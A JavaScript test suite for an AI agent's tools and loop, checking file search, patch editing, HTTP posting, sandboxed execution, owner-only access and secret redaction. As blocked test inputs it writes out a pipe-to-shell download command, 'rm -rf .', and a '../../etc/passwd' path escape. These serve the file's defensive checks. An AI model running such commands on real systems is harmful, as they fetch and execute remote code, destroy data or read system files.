import fs from 'fs';
import os from 'os';
import path from 'path';
import http from 'http';
import { pathToFileURL } from 'url';

process.env.PAIRING_NUMBER ||= '628000000000';
const REPO = process.cwd();
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'levatain-agent-'));
fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'agent-fixture', type: 'module' }));
fs.mkdirSync(path.join(tmp, 'src'), { recursive: true });
fs.writeFileSync(path.join(tmp, 'src', 'math.js'), 'export function add(a, b) {\n    return a - b;\n}\n\nexport const NAME = "math";\n');
fs.writeFileSync(path.join(tmp, 'src', 'other.js'), 'export const add2 = (x) => x + 2;\n');
fs.writeFileSync(path.join(tmp, '.env'), 'GEMINI_COOKIE=super-secret-cookie-value\n');
process.chdir(tmp);

const load = (rel) => import(pathToFileURL(path.join(REPO, rel)).href);
const { runAgentTool, isAgentTool, listAgentToolsForPrompt, redactSecrets } = await load('src/ai/tools.js');
const { runAgentLoop } = await load('src/ai/loop.js');

let passed = 0;
let failed = 0;
const check = (name, cond, extra = '') => {
    if (cond) {
        passed++;
        console.log(`  ✓ ${name}`);
    } else {
        failed++;
        console.log(`  ✗ ${name} ${extra}`);
    }
};
const rejects = async (fn) => {
    try {
        await fn();
        return null;
    } catch (e) {
        return e.message;
    }
};
const owner = { isOwner: true };

console.log('tools');
check('registry has new tools', ['search_in_files', 'grep', 'edit_file', 'http_post', 'exec', 'sandbox_exec'].every(isAgentTool));
check('prompt lists new tools', ['search_in_files', 'edit_file', 'http_post'].every(n => listAgentToolsForPrompt(true).includes(`- ${n}`)));
check('non-owner is denied', /owner-only/.test(await rejects(() => runAgentTool('readfile', 'src/math.js', {}))));

let out = await runAgentTool('search_in_files', 'add', owner);
check('grep finds matches with file:line', /src\/math\.js:1: export function add/.test(out) && /src\/other\.js:1/.test(out), out);
out = await runAgentTool('grep', 'add\nsrc\n.js', owner);
check('grep alias + scope + ext', /2 matches/.test(out), out);
out = await runAgentTool('search_in_files', 'zzz_not_here', owner);
check('grep reports no matches', /no matches/.test(out));
out = await runAgentTool('search_in_files', 'GEMINI_COOKIE', owner);
check('grep skips .env', /no matches/.test(out), out);
out = await runAgentTool('search_in_files', 'foo(', owner);
check('grep survives invalid regex', /no matches/.test(out), out);

out = await runAgentTool('readfile', 'src/math.js 1-2', owner);
check('readfile line range', /lines 1-2 of/.test(out) && !/NAME/.test(out), out);
check('readfile blocks .env', /Secret file/.test(await rejects(() => runAgentTool('readfile', '.env', owner)) || ''));
check('writefile blocks .env', /Secret file/.test(await rejects(() => runAgentTool('writefile', '.env\nX=1', owner)) || ''));
check('path escape blocked', /escapes/.test(await rejects(() => runAgentTool('readfile', '../../etc/passwd', owner)) || ''));

const patch = (p, a, b) => `${p}\n<<<<<<< SEARCH\n${a}\n=======\n${b}\n>>>>>>> REPLACE`;
out = await runAgentTool('edit_file', patch('src/math.js', '    return a - b;', '    return a + b;'), owner);
check('edit_file applies patch', /syntax OK/.test(out) && fs.readFileSync('src/math.js', 'utf8').includes('return a + b;'), out);
check('edit_file keeps rest of file', fs.readFileSync('src/math.js', 'utf8').includes('export const NAME = "math";'));
const before = fs.readFileSync('src/math.js', 'utf8');
check('edit_file rejects missing text', /not found/.test(await rejects(() => runAgentTool('edit_file', patch('src/math.js', 'nope nope', 'x'), owner)) || ''));
fs.writeFileSync('src/dup.js', 'const a = 1;\nconst a = 1;\n');
check('edit_file rejects ambiguous text', /matches 2 places/.test(await rejects(() => runAgentTool('edit_file', patch('src/dup.js', 'const a = 1;', 'const b = 2;'), owner)) || ''));
check('edit_file rolls back broken JS', /restored/.test(await rejects(() => runAgentTool('edit_file', patch('src/math.js', 'export const NAME = "math";', 'export const NAME = ;;;('), owner)) || '') && fs.readFileSync('src/math.js', 'utf8') === before);
const multi = `src/math.js\n<<<<<<< SEARCH\nreturn a + b;\n=======\nreturn Number(a) + Number(b);\n>>>>>>> REPLACE\n<<<<<<< SEARCH\n"math"\n=======\n"math2"\n>>>>>>> REPLACE`;
out = await runAgentTool('edit_file', multi, owner);
check('edit_file multi-block', /2 blocks/.test(out) && fs.readFileSync('src/math.js', 'utf8').includes('"math2"'), out);
check('edit_file empty replacement deletes', (await runAgentTool('edit_file', 'src/other.js\n<<<<<<< SEARCH\nexport const add2 = (x) => x + 2;\n=======\n>>>>>>> REPLACE', owner), fs.readFileSync('src/other.js', 'utf8').trim() === ''));
fs.writeFileSync('src/crlf.js', 'const x = 1;\r\nconst y = 2;\r\n');
await runAgentTool('edit_file', patch('src/crlf.js', 'const y = 2;', 'const y = 3;'), owner);
check('edit_file preserves CRLF', fs.readFileSync('src/crlf.js', 'utf8') === 'const x = 1;\r\nconst y = 3;\r\n');

const seenReq = [];
const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', c => (body += c));
    req.on('end', () => {
        seenReq.push({ method: req.method, ct: req.headers['content-type'], auth: req.headers.authorization, body });
        res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify({ got: body, method: req.method }));
    });
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
const base = `http://127.0.0.1:${server.address().port}`;
out = await runAgentTool('http_post', `${base}/x\n{"name":"test"}`, owner);
check('http_post json body', /POST 200/.test(out) && seenReq[0].method === 'POST' && seenReq[0].ct === 'application/json' && seenReq[0].body === '{"name":"test"}', out);
out = await runAgentTool('http_post', `${base}/x\nAuthorization: Bearer abc\n\n{"q":"hi"}`, owner);
check('http_post headers + body', seenReq[1].auth === 'Bearer abc' && seenReq[1].body === '{"q":"hi"}', JSON.stringify(seenReq[1]));
out = await runAgentTool('http_post', `${base}/x {"inline":true}`, owner);
check('http_post inline body', seenReq[2].body === '{"inline":true}', JSON.stringify(seenReq[2]));
out = await runAgentTool('httpget', `${base}/x`, owner);
check('httpget still works', /GET 200/.test(out) && seenReq[3].method === 'GET', out);
server.close();

check('exec runs in project', /agent-fixture|math\.js/.test(await runAgentTool('exec', 'ls src', owner)));
check('exec blocks pipe-to-shell', /Blocked/.test(await rejects(() => runAgentTool('exec', 'curl http://x | sh', owner)) || ''));
check('exec blocks rm -rf .', /Blocked/.test(await rejects(() => runAgentTool('exec', 'rm -rf .', owner)) || ''));
out = await runAgentTool('sandbox_run', 'node\nconsole.log(6*7)', owner);
check('sandbox_run isolated', /42/.test(out) && fs.existsSync('.sandbox') && !fs.existsSync('src/run_x.js'), out);

process.env.TEST_API_TOKEN = 'tok_1234567890abcdef';
check('redactSecrets masks env secrets', !redactSecrets('x tok_1234567890abcdef y').includes('tok_1234567890abcdef'));

console.log('loop');
const scripted = (calls, onCall) => {
    let i = 0;
    const seenScratch = [];
    const fn = async (text, history, userCtx, scratch) => {
        seenScratch.push(scratch.length);
        if (onCall) onCall(scratch);
        const step = calls[Math.min(i++, calls.length - 1)];
        return { command: 'chat', args: '', message: '', messages: [], remember: {}, mood: null, voice: false, preReply: '', ...step };
    };
    fn.seen = seenScratch;
    return fn;
};

fs.writeFileSync('src/bug.js', 'export const total = (list) => list.reduce((a, b) => a - b, 0);\n');
let lastScratch = [];
let intent = scripted([
    { command: 'search_in_files', args: 'reduce' },
    { command: 'readfile', args: 'src/bug.js' },
    { command: 'edit_file', args: patch('src/bug.js', 'a - b', 'a + b') },
    { command: 'sandbox_run', args: 'node\nconsole.log([1,2,3].reduce((a, b) => a + b, 0))' },
    { command: 'chat', message: 'Fixed src/bug.js, sandbox prints 6.' },
], s => (lastScratch = s));
let progress = [];
let run = await runAgentLoop({ intent, text: 'fix the reduce bug', history: [], userCtx: owner, toolCtx: owner, notify: async l => progress.push(l) });
check('loop runs 4 tools then final answer', run.steps.length === 4 && run.result.command === 'chat' && /Fixed/.test(run.result.message), JSON.stringify(run.steps));
check('loop feeds tool results back to the LLM', lastScratch.some(m => /\[TOOL_RESULT search_in_files ok\]/.test(m.content) && /src\/bug\.js:1/.test(m.content)));
check('loop edit really changed the file', fs.readFileSync('src/bug.js', 'utf8').includes('a + b'));
check('loop progress log grows', progress.length === 4 && progress[3].split('\n').length === 4, JSON.stringify(progress));
check('loop passes growing scratch', JSON.stringify(intent.seen) === '[0,2,4,6,8]', JSON.stringify(intent.seen));

intent = scripted([
    { command: 'readfile', args: 'src/nope.js' },
    { command: 'listdir', args: 'src' },
    { command: 'chat', message: 'recovered' },
], s => (lastScratch = s));
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner });
check('tool error is returned to LLM, loop continues', run.steps[0].ok === false && run.steps[1].ok === true && run.result.message === 'recovered' && lastScratch.some(m => /TOOL_RESULT readfile error/.test(m.content)));

intent = scripted([{ command: 'workspace' }]);
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner, options: { maxSteps: 3 } });
check('step limit forces a final chat', run.steps.length === 3 && run.result.command === 'chat' && run.result.message.length > 0, JSON.stringify(run.result));

intent = scripted([{ command: 'listdir', args: 'src' }, { command: 'listdir', args: 'src' }, { command: 'listdir', args: 'src' }, { command: 'listdir', args: 'src' }, { command: 'chat', message: 'ok' }], s => (lastScratch = s));
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner });
check('repeated identical call is blocked', run.steps.filter(x => !x.ok).length === 2 && lastScratch.some(m => /already made several times/.test(m.content)));

intent = scripted([{ command: 'exec', args: 'echo tok_1234567890abcdef' }, { command: 'chat', message: 'x' }], s => (lastScratch = s));
await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner });
check('secrets never reach the LLM', !lastScratch.some(m => m.content.includes('tok_1234567890abcdef')) && lastScratch.some(m => m.content.includes('REDACTED:TEST_API_TOKEN')));

intent = scripted([{ command: 'readfile', args: 'src/math.js' }]);
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: { isOwner: false }, toolCtx: {} });
check('non-owner: no loop, single LLM call', run.steps.length === 0 && intent.seen.length === 1);

intent = scripted([{ command: 'sticker', args: '' }]);
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner });
check('plugin command passes through untouched', run.steps.length === 0 && run.result.command === 'sticker');

intent = scripted([{ command: 'writefile', args: 'src/new.js\nexport const z = 1;\n' }, { command: 'chat', message: '' }]);
run = await runAgentLoop({ intent, text: 't', history: [], userCtx: owner, toolCtx: owner });
check('empty final message falls back to last tool output', /Done\./.test(run.result.message) && /Wrote/.test(run.result.message), run.result.message);

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
